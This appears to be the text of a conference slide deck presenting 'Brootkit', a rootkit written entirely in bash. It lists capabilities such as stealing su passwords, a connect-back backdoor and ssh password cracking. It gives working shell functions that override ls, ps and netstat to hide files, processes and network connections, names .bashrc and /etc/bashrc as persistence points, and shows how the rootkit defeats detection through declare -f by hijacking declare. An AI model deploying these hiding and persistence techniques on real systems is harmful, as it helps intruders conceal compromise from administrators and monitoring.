SHELL Hacking
阿里云 - wzt
•
When  control  a  unix-like  system,    Than?    
[root@localhost fucking_rootkit]#  ls
Makefile furootkit.c
[root@localhost fucking_rootkit]#  make
make   -C  /lib/modules/2.6.32/build  M=/root/lkm/fucking_rootkit modules
make:  ***  /lib/modules/2.6.32/build:  No  such  file  or  directory.    Stop.
make:  ***  [furootkit]  Error  2
[root@localhost fucking_rootkit]#  gcc
bash:  gcc:  command   not  found
[root@localhost fucking_rootkit]#
[root@localhost fucking_rootkit]#  perl
bash:  perl:  command   not  found
[root@localhost fucking_rootkit]#
[root@localhost fucking_rootkit]#  python
bash:  python:  command   not  found
[root@localhost fucking_rootkit]#
Do  everything  in  SHELL
• Unix  kiss  philosophy
Ø keep  it  sample  stupid.
Ø do  one  thing  do  it  well.
• The  goal  of  shell  scripts
Ø no  cpu arch  depend
Ø no  complier  depend  
Ø no  interpreter  depend
Ø no  os and  kernel  distribution  depend
Ø sh/bash/csh/zsh
Ø unix/bsd/solaris/linux
Ø hundreds  of  open  source  tools
Ø just  a  shell  script?
Bash  Rootkit
•
Histroy of  bash  rootkit
ü
If  bash  shell  scripts  can  be  designed  for  security  tools  like  chkrootkit or  rkhunter,  
ü
so  too  can  it  be  implemented  for  a  rootkit.
•
Brootkit
ü
Lightweight  rootkit  implemented  using  bash  shell  scripts.
ü
FEATURES
I.
more  hidable ability  against  admintrator or  hids.
II.
su passwd thief.
III.
hide  file  and  directories.
IV.
hide  process.
V.
hide  network  connections.
VI.
connect  backdoor.
VII.
multi  thread  port  scanner.
VIII.
http  download.
IX.
multi  thread  ssh passwd crack.
ü
TARGET  OS
I.
centos
II.
rhel
III.
ubuntu
IV.
debian
V.
fedora
VI.
freebsd
The  life  of  `ls`
ls ->  glibc/opendir()  ->  syscall/sys_getdents()  ->  vfs/vfs_readdir()  ->  ext4/ext4_readdir()
preload                                                  
hook  sct
hjack vfs
inline  hook  
What  is  the  NEXT?      
ls ->  bash  ->  shell  function  ->  builtin ->  hashtable ->  $PATH  ->  command_not_found_handle/exit
• Override  shell  function
[root@localhost brootkit]#  ls
README.md    bashproxy.sh    brbomb.sh        brget.sh          brsh.conf
brshrootkit.sh    install.sh    passwd1.lst      sshcrack.sh        ubd.sh
bashbd.sh    bashtn.sh          brconfig.sh    brootkit.sh    brshconfig.sh      cronbd.sh              pass.lst
passwd2.lst      sshcrack1.exp    uninstall.sh
bashnc.sh    br.conf
brdaemon.sh    brscan.sh        brshinstall.sh    host.lst
passwd.lst sshcrack.exp sshcrack2.exp    user.lst
[root@localhost brootkit]#  function  ls()
>  {
>  echo  "hjacked?"
>  }
[root@localhost brootkit]#  ls
hjacked?
[root@localhost brootkit]#
but
[root@localhost brootkit]#  /bin/ls
README.md    bashproxy.sh    brbomb.sh        brget.sh          brsh.conf
brshrootkit.sh    install.sh    passwd1.lst      sshcrack.sh        ubd.sh
bashbd.sh    bashtn.sh          brconfig.sh    brootkit.sh    brshconfig.sh      cronbd.sh              pass.lst
passwd2.lst      sshcrack1.exp    uninstall.sh
bashnc.sh    br.conf
brdaemon.sh    brscan.sh        brshinstall.sh    host.lst
passwd.lst sshcrack.exp sshcrack2.exp    user.lst
•
[root@localhost brootkit]#  function  /bin/ls()
•
>  {
•
>  echo  "hjacked again?"
•
>  }
•
[root@localhost brootkit]#  /bin/ls
•
hjacked again?
•
[root@localhost brootkit]#
• Another  trouble  – ls output  format
[root@localhost brootkit]#  ls -l|head -n  4
total  420
-rw-r--r-- 1  root  root
5527  Apr    3  02:27  README.md
-rwxr-xr-x   1  root  root
963  Feb  11    2015  bashbd.sh
-rwxr-xr-x   1  root  root
60  Feb  12    2015  bashnc.sh
[root@localhost brootkit]#  ls -l
hjacked?
[root@localhost brootkit]#
• Need  more  complex  pseudo
–
useful  common  arguments    (ls –alt)
–
tty window  size
–
bash  character  colors
hide  file/process
•
Hide  file/directory
fake_file=`/bin/ls $@`
old_ifs=$IFS;  IFS=",“
for  hide_file in  ${br_hide_file[@]}
do
fake_file=`echo  "$fake_file"  |  sed -e  '/'$hide_file'/d'`
done
IFS=$old_if
echo  "$fake_file"
l
Hide  process
function  ps()
{
old_ifs=$IFS;  IFS=","
proc_name=`/bin/ps $@`
for  hide_proc in  ${br_hide_proc[@]}
do
proc_name=`echo  "$proc_name"  |  sed -e  '/'$hide_proc'/d'`
done
echo  "$proc_name"
IFS=$old_ifs
}
Hide  net
• Hide  tcp connections
function  netstat()
{
local  hide_port tmp_port old_ifs
.  $BR_ROOTKIT_PATH/brconfig.sh
br_load_config $BR_ROOTKIT_PATH/br.conf
old_ifs=$IFS;  IFS=","
tmp_port=`/bin/netstat $@`
for  hide_port in  ${br_hide_port[@]}
do
tmp_port=`echo  "$tmp_port"   |  sed -e  '/'$hide_port'/d'`
done
echo  "$tmp_port"
IFS=$old_ifs
}
• Poc vs  Real  world
–
Mulit consoles - screen/bash*n
–
Single  user    - ~/.bashrc ~/.bash_profile
–
All  users            - /home/*      /etc/bashrc /etc/bash_profile
–
Reboot
Anti  
[root@localhost brootkit]#   declare  -f
/bin/ls ()
{
echo  "hjacked again?"
}
ls ()
{
echo  "hjacked?"
}
[root@localhost brootkit]#
[root@localhost brootkit]#   set|tail
consoletype=pty
tmpid=0
/bin/ls ()
{
echo  "hjacked again?"
}
ls ()
{
echo  "hjacked?"
}
WTF?
So  weak?
Is that a fucking rootkit??
Anti    Anti
• Shell  builtins
•
[root@localhost brootkit]#  declare()  {
•
>  echo  "hijack   declare"
•
>  }
•
[root@localhost brootkit]#  declare
•
hijack  declare
•
[root@localhost brootkit]#
•
[root@localhost brootkit]#  builtin declare  -f
•
/bin/ls ()
•
{
•
echo  "hjacked again?"
•
}
•
ls ()
•
{
•
echo  "hjacked?"
•